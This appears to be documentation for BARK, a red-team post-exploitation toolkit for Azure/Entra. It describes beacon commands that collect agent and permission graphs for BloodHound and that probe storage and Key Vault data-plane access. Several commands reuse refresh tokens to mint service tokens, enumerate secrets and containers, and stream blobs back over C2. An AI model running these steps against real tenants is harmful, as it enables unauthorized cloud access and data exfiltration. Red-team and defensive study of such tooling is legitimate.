# Additional collectors

[English](Additional-Collectors.md) | [日本語](ja/Additional-Collectors.md)

[Wiki home](Home.md) | [Operator workflow](../README.md)

### Entra Agent OpenGraph collection

`bark_get_entra_agents_opengraph` collects the Microsoft Graph Agent ID control
plane and writes a generic BloodHound OpenGraph JSON payload. It currently
covers Agent ID blueprints, blueprint principals, agent identities, agent
users, owners, blueprint sponsors, and the links between those objects and existing
Entra service-principal IDs. It deliberately omits execution-context edges
until the credential mode is observable; this avoids treating an agent as
acting as a maker when the API data does not prove that relationship.

```text
beacon> bark_get_entra_agents_opengraph <graph_token>
```

The token needs the Microsoft Graph permissions required by the Agent ID
endpoints, such as `AgentIdentity.Read.All`,
`AgentIdentityBlueprint.Read.All`,
`AgentIdentityBlueprintPrincipal.Read.All`, and `User.ReadBasic.All` as
applicable. Permission and directory-role enrichment may additionally require
directory administrative read permissions such as `Directory.Read.All`.
Blueprint sponsor reads use `Application.Read.All`; agent-identity sponsors
are intentionally not requested because the current application API requires
`AgentIdentity.ReadWrite.All`. The default `bark_download_mode on` setting
returns the OpenGraph JSON via C2 instead of writing it to the beacon's current
directory.

### Foundry and Power Platform OpenGraph collection

Foundry collection uses an ARM bearer token and reads only control-plane
accounts, projects, and account-scope role assignments:

```text
beacon> bark_get_azurerm_foundry_opengraph <arm_token>
```

Power Platform collection uses a token for the separate
`api.powerplatform.com` resource and inventories environments, connection
metadata, Copilot Studio agents, agent/Cloud flows, and connector-operation
metadata:

```text
beacon> bark_get_powerplatform_opengraph <powerplatform_token>
```

Neither command reads connection secrets, flow definitions/clientdata, flow run
history, individual run-only principals, model content, deployments, or
Foundry data-plane resources. Inventory owner IDs are emitted as Entra object
IDs where Microsoft documents them as such; direct Cloud Flows fallback owner
IDs remain metadata-only Dataverse identifiers.
For Copilot agents, the collector emits `AZAgent_CanInvoke` only for the
documented no-auth/anyone-with-the-link case, and emits `AZAgent_ActsAs` only
when an operation explicitly uses a maker-provided connection and exposes its
operation creator. Aggregate viewer/editor counts are not converted into false
individual principal edges.

### Data-plane probes

Data-plane access uses a token for the data endpoint, not an ARM token.
The probes list storage containers and Key Vault secrets, so a successful
HTTP response indicates data-plane access while a 403 indicates that the
identity can enumerate the resource but lacks the corresponding data role.

For the file-backed workflow, run ARM/Entra BH collection first. The probes
read the newest matching JSON files from the beacon's current directory and
write no output files:

```
beacon> bark_get_azurerm_info_bh <arm_token>
beacon> bark_get_tokens_with_rt https://storage.azure.com "" <refreshToken> <tenantId>
beacon> bark_probe_storage_data_plane <storage_token>
beacon> bark_list_storage_containers <storage_token> <account_name>
beacon> bark_list_storage_blobs <storage_token> <account_name> <container_name>
beacon> bark_download_storage_blob <storage_token> <account_name> <container_name> <blob_name> [download_name]
beacon> bark_get_tokens_with_rt https://vault.azure.net "" <refreshToken> <tenantId>
beacon> bark_probe_key_vault_data_plane <vault_token>
```

`bark_probe_storage_data_plane` discovers `*.blob.core.windows.net` hosts
from `AZStorageAccount_*.json`, `AZApp_*.json`, and
`AZServicePrincipal_*.json`. `bark_probe_key_vault_data_plane` similarly
discovers vault hosts from `AZKeyVault_*.json` and the app/service-principal
files. These commands require their respective `storage.azure.com` or
`vault.azure.net` token.

For direct access when the storage account and container names are already
known, `bark_list_storage_containers` lists account containers and
`bark_list_storage_blobs` lists blob names and metadata in one container.
Both commands request up to 5,000 objects per page and follow continuation
markers until the listing is complete. The token must be scoped to
`https://storage.azure.com` and the identity needs an appropriate
Storage Blob Data role.

To download a known blob, use `bark_download_storage_blob`. It streams the
object through `BeaconDownload()` in 256 KiB parts and does not write the
blob to the beacon's disk. If `download_name` is omitted, BARK generates a
safe filename prefix from the account and blob name. Reassemble the emitted
`.partNNNNN` files in numeric order on the operator machine.

The refresh-token shortcut performs both token exchanges and probes after
reading the same discovery files:

```
beacon> bark_probe_data_plane_rt <tenantId> <refreshToken>
```

For a completely file-independent run, use the self-contained probe. It
exchanges the refresh token for ARM and MS Graph tokens, discovers targets
from subscriptions plus application/service-principal URLs, then obtains
storage and Key Vault tokens and probes the discovered endpoints:

```
beacon> bark_probe_data_plane <refreshToken> <tenantId>
```

This command keeps discovery state in memory and does not read or write
target files. Both refresh-token data-plane commands try the six default
client IDs automatically. If Microsoft Graph token acquisition or app/SP
requests fail, the self-contained probe retries app/SP discovery through
legacy AAD Graph; ARM discovery remains available independently.

The same self-contained probe is the final probe stage of
`bark_get_all_info_bh_rt`, so the combined workflow remains compatible with
diskless BH collection and does not depend on `AZ*.json` discovery files.
